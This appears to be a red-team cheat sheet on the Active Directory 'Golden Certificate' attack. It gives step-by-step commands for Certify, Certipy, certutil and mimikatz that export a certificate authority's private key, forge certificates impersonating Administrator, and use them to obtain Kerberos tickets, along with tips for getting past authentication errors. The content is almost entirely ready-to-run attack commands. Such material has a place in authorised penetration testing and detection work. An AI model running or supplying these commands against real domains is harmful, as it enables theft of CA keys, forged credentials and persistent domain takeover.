# Active Directory - Golden Certificate

A Golden Certificate is a maliciously crafted certificate that an attacker generates using the CA’s private key.

## Obtain CA certificate

Export the CA certificate including the private key:

* [GhostPack/Certify](https://github.com/GhostPack/Certify)

    ```ps1
    Certify.exe manage-self --dump-certs
    ```

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

    ```ps1
    certipy ca -u 'administrator@corp.local' -p 'Passw0rd!' -ns '10.10.10.10' -target 'CA.CORP.LOCAL' -config 'CA.CORP.LOCAL\CORP-CA' -backup
    ```

* [windows-gui/certsrv.msc](https://learn.microsoft.com/en-us/system-center/scom/obtain-certificate-windows-server-and-operations-manager)
    * Open `certsrv.msc`
    * Right click the CA -> `All Tasks` -> `Back up CA...`
    * Follow the wizard but make sure to check `Private key and CA certificate`

* [windows-gui/certlm.msc](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/export-certificate-private-key)
    * Open `certlm.msc`
    * Go to `Personal` -> `Certificates`
    * Right click the CA signing certificate -> `All Tasks` -> `Export`
    * Follow the wizard but make sure to choose `Yes, export the private key`

* [windows-commands/certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

    ```ps1
    certutil -backupKey -f -p SuperSecurePassw0rd! C:\Windows\Tasks\CaBackupFolder
    ```

* [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

    ```ps1
    mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
    ```

## Forge Golden Certificates

Forge a certificate of a target principal:

* [GhostPack/Certify](https://github.com/GhostPack/Certify)

    ```ps1
    Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500
    ```

* [GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)

    ```ps1
    ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
    ```

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

    ```ps1
    certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'

    certipy forge -template 'attacker.pfx' -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```

:warning: Useful parameters when generating a golden certificate.

* `-crl`: If the `-crl` option is omitted when forging, authentication might fail. While the KDC doesn't typically perform an active CRL lookup during initial TGT issuance for performance reasons, it does often check for the presence of a CDP extension in the certificate. Its absence can lead to a `KDC_ERROR_CLIENT_NOT_TRUSTED` error.
* `-template 'attacker.pfx'`: Certipy will copy extensions (like Key Usage, basic constraints, AIA, etc.) from attacker.pfx into the new forged certificate, while still setting the **subject**, **UPN**, and *SID* as specified.
* `-subject "CN=xyz-CA-1, DC=xyz, DC=htb"`: set the **Distinguished Name** for the certificate

## Request a TGT

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

    ```ps1
    Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>
    ```

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

    ```ps1
    certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.10.10'
    ```

## References

* [BloodHound - GoldenCert Edge - SpecterOps - April 20, 2025](https://bloodhound.specterops.io/resources/edges/golden-cert)
* [Certificate authority - The Hacker Recipes - July 16,2025](https://www.thehacker.recipes/ad/persistence/adcs/certificate-authority)
* [Domain Persistence Techniques - Valdemar Carøe - August 6, 2025](https://github.com/GhostPack/Certify/wiki/3-‐-Domain-Persistence-Techniques)
* [Post‐Exploitation - Oliver Lyak - May 15, 2025](https://github.com/ly4k/Certipy/wiki/07-‐-Post‐Exploitation)
* [Steal or Forge Authentication Certificates - MITRE ATT&CK - April 15, 2025](https://attack.mitre.org/techniques/T1649/)
